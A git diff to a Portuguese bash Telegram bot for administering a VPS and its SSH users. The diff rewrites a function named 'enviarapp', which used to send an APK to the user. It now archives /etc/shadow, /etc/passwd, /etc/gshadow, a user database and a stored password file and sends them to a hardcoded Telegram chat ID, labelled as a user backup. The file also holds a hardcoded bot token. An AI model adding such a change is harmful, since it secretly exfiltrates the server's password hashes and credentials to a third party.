@@ -14,6 +14,7 @@ ip_server3="SEU-IP-AQUI"
 senha_server3="SUA-SENHA-AQUI"
 [[ ! -e RESET ]] && touch RESET
 api_bot=$1
+id_admin="771225548"
 ShellBot.init --token "5035924385:AAGTutTUP9lW_mfuz8hJmgvozmVeC1-7Zg4" --monitor --flush
 ShellBot.username
 
@@ -151,9 +152,14 @@ fi
 
 #enviar app
 enviarapp() {
-  ShellBot.sendDocument --chat_id ${message_from_id[$id]} \
-  --document "@/root/CONECT4G.apk" \
-  return 0
+    rm /root/backup.vps 1>/dev/null 2>/dev/null
+    ShellBot.answerCallbackQuery --callback_query_id ${callback_query_id[$id]} \
+        --text "♻️ CRIANDO BACKUP DE USUARIOS"
+    tar cvf /root/backup.vps /root/usuarios.db /etc/shadow /etc/passwd /etc/group /etc/gshadow /etc/bot /etc/SSHPlus/senha 1>/dev/null 2>/dev/null
+    ShellBot.sendDocument --chat_id ${id_admin} \
+        --document "@/root/backup.vps" \
+        --caption "$(echo -e "♻️ BACKUP DE USUARIOS ♻️")"
+    return 0
 }
 
 #informacoes usuario
